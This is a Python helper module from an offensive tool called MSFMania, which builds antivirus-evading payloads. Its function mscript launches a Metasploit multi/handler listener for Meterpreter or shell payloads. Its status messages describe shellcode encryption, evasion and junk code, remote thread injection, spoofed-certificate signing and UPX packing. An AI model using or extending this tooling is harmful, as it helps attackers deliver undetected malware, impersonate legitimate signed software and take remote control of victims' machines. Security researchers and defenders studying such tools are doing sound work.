from string import ascii_letters
from random import randint, SystemRandom
from os import system


blue = '\033[94m'
green = '\033[92m'
ocra = '\033[93m'
red = '\033[91m'
endc = '\033[0m'
bold = '\033[1m'
underline = '\033[4m'
darkcyan = '\033[36m'


def varname_creator():
    varname = ''.join(SystemRandom().choice(ascii_letters) for _ in range(randint(8, 12)))
    return varname


def mscript(payload, lhost, lport):
    lhost = lhost.replace("lhost=", "")
    lport = lport.replace("lport=", "")
    if "meterpreter" in payload:
        system(f'msfconsole -x "use exploits/multi/handler; set lhost {lhost }; set lport {lport}; set payload {payload}; set AutoLoadStdapi false; set AutoSystemInfo false; set AutoVerifySession false; exploit -j -z" ')

    elif "shell" in payload:
        system(f'msfconsole -x "use exploits/multi/handler; set lhost {lhost }; set lport {lport}; set payload {payload}; exploit -j -z"')


def banner():
    # Univers ASCII banner
    print(bold + """                                                                                            
                ███╗   ███╗███████╗███████╗███╗   ███╗ █████╗ ███╗   ██╗██╗ █████╗ 
                ████╗ ████║██╔════╝██╔════╝████╗ ████║██╔══██╗████╗  ██║██║██╔══██╗
                ██╔████╔██║███████╗█████╗  ██╔████╔██║███████║██╔██╗ ██║██║███████║
                ██║╚██╔╝██║╚════██║██╔══╝  ██║╚██╔╝██║██╔══██║██║╚██╗██║██║██╔══██║
                ██║ ╚═╝ ██║███████║██║     ██║ ╚═╝ ██║██║  ██║██║ ╚████║██║██║  ██║
                ╚═╝     ╚═╝╚══════╝╚═╝     ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝╚═╝  ╚═╝                                                                                                                                                                                                                   
             Version : 2.4   -   Author : Killian CASAROTTO   -  Updated : 08/03/2021           
    """ + endc)


def not_installed(package):
    print(f"{red + bold}[x] '" + package + f"' is not installed.{endc}\n")


def error_payload_lhost():
    print(f"{red + bold}[x] The payload needs the '-lh' or '--lhost' argument.\n{endc + bold}Exiting...{endc}\n")
    exit()


def error_payload_lport():
    print(f"{red + bold}[x] The payload needs the '-lp' or '--lport' argument.\n{endc + bold}Exiting...{endc}\n")
    exit()


def error_copt_nomsf():
    print(f"{red + bold}[x] You can't add msf command without adding msf shellcode.\n{endc + bold}Exiting...{endc}\n")
    exit()


def error_payload_required():
    print(f"{red + bold}[x] Msf payload or custom payload is required.{endc + bold}\nExiting...{endc}\n")
    exit()


def error_payload_injectiontype():
    print(f"{red + bold}[x] The payload needs the '-it' or '--injectiontype' argument.{endc + bold}\nExiting...{endc}\n")
    exit()


def error_injectiontype():
    print(f"{red + bold}[x] 'Remote Thread Injection' or 'Remote Thread Hijack' requiere '-pn' argument.{endc}\n")
    exit()


def error_procname(processname):
    print(f"{red + bold}[x] The specified process name is incorrect '{endc}{bold}{processname}'.\nExiting...{endc}\n")
    exit()


def error_icon(icon):
    print(f"{red + bold}[x] The specified icon name is incorrect {endc + bold}'" + icon + "'.\nExiting...{endc}\n")
    exit()


def error_icon_file(icon):
    print(f"{red + bold}[x] The specified icon filename does not exist {endc + bold}'" + icon + "'.\nExiting...{endc}\n")
    exit()


def shellcode_generated():
    print(f"\n{bold}[+] Shellcode generated.{endc}\n")


def shellcode_encrypted():
    print(f"{bold}[+] Shellcode encrypted.{endc}\n")


def sleep_added(seconds):
    print(f"{bold}[+] {seconds} seconds delay before payloads execution.{endc}\n")


def evasion_added():
    print(f"{bold}[+] Evasion code added.{endc}\n")


def junkcode_added():
    print(f"{bold}[+] Junkcode added.{endc}\n")


def compilation_completed():
    print(f"{bold}[+] File compiled and stripped.{endc}\n")


def pe_signed(certificate):
    print(f"{bold}[+] PE file signed with spoofed certificate from {certificate}{endc}\n")


def bad_certificate(ex):
    print(f"{red + bold}[x] There is an error in the specified certificate. The executable file has not been signed.\n{ex}{endc}\n")


def file_size(fs):
    print(f"{bold}[+] Final PE size: {fs} bytes.\n{endc}")


def packed_file_changes(fs0, fs1):
    print(f"{bold}[+] Final PE file size: {fs0} ==> {fs1} bytes.{endc}\n")


def pe_packed():
    print(f"{bold}[+] PE file packed with UPX.\n{endc}")


def rar_compressed():
    print(f"{bold}[+] PE file compressed to RAR file.{endc}\n")


def file_hash(hash_type, hash_code):
    print(f"{bold}[+] {hash_type} hash: {hash_code}{endc}\n")
